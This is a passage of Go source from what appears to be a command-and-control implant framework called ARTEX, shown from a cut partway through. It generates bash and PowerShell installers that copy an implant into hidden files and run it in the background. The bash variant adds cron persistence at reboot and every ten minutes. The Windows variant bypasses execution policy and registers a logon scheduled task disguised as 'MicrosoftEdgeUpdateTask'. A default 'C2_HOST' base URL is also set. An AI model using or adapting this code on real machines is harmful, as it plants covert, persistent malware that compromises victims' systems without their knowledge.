		body = `#!/usr/bin/env bash
# ARTEX installer (cron) for {{ID}}
set -eu
SRC="$(cd "$(dirname "$0")" && pwd)"
if [ "$(id -u)" = 0 ]; then LIB=/usr/local/lib; else LIB="$HOME/.local/share"; mkdir -p "$LIB"; fi
cp "$SRC/implant.sh" "$LIB/.atx-{{ID}}.sh"
chmod 700 "$LIB/.atx-{{ID}}.sh"
( crontab -l 2>/dev/null | grep -v "atx-{{ID}}" ;
  echo "@reboot /bin/bash $LIB/.atx-{{ID}}.sh >/dev/null 2>&1" ;
  echo "*/10 * * * * /bin/bash $LIB/.atx-{{ID}}.sh >/dev/null 2>&1" ) | crontab -
nohup setsid /bin/bash "$LIB/.atx-{{ID}}.sh" >/dev/null 2>&1 &
echo "installed (cron + running now)"
`
	default:
		body = `#!/usr/bin/env bash
# ARTEX installer (no persistence) for {{ID}}
set -eu
SRC="$(cd "$(dirname "$0")" && pwd)"
if [ "$(id -u)" = 0 ]; then LIB=/usr/local/lib; else LIB="$HOME/.local/share"; mkdir -p "$LIB"; fi
cp "$SRC/implant.sh" "$LIB/.atx-{{ID}}.sh"
chmod 700 "$LIB/.atx-{{ID}}.sh"
nohup setsid /bin/bash "$LIB/.atx-{{ID}}.sh" >/dev/null 2>&1 &
echo "installed (no persistence, running now)"
`
	}
	rep := strings.NewReplacer(
		"{{ID}}", im.ID,
		"{{TOKEN}}", im.Token,
		"{{BASE}}", base,
		"{{BEACON}}", im.BeaconPath,
		"{{RESP}}", im.RespPath,
	)
	return rep.Replace(body)
}

// powershellInstall renders a Windows installer for persistence none|schtasks.
func powershellInstall(im *Implant, persistence string) string {
	base := im.BaseURL
	if base == "" {
		base = "https://C2_HOST"
	}
	var body string
	if persistence == "schtasks" {
		body = `# ARTEX installer (scheduled task) for {{ID}}
$ErrorActionPreference = "Stop"
$Src = Split-Path -Parent $MyInvocation.MyCommand.Path
$Dest = Join-Path $env:ProgramData ".atx"
New-Item -ItemType Directory -Force -Path $Dest | Out-Null
Copy-Item (Join-Path $Src "implant.ps1") (Join-Path $Dest ".atx-{{ID}}.ps1") -Force
$argstr = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File '" + (Join-Path $Dest ".atx-{{ID}}.ps1") + "'"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $argstr
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateTask{{ID}}" -Action $action -Trigger $trigger -Force | Out-Null
Start-ScheduledTask -TaskName "MicrosoftEdgeUpdateTask{{ID}}"
Write-Host "installed (schtasks MicrosoftEdgeUpdateTask{{ID}})"
`
	} else {
		body = `# ARTEX installer (no persistence) for {{ID}}
$ErrorActionPreference = "Stop"
$Src = Split-Path -Parent $MyInvocation.MyCommand.Path
$Dest = Join-Path $env:ProgramData ".atx"
New-Item -ItemType Directory -Force -Path $Dest | Out-Null
Copy-Item (Join-Path $Src "implant.ps1") (Join-Path $Dest ".atx-{{ID}}.ps1") -Force
$argstr = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File '" + (Join-Path $Dest ".atx-{{ID}}.ps1") + "'"
Start-Process powershell -WindowStyle Hidden -ArgumentList $argstr
Write-Host "installed (no persistence, running now)"
`
	}
	rep := strings.NewReplacer(
		"{{ID}}", im.ID,
		"{{TOKEN}}", im.Token,
		"{{BASE}}", base,
		"{{BEACON}}", im.BeaconPath,
		"{{RESP}}", im.RespPath,
	)
	return rep.Replace(body)
}
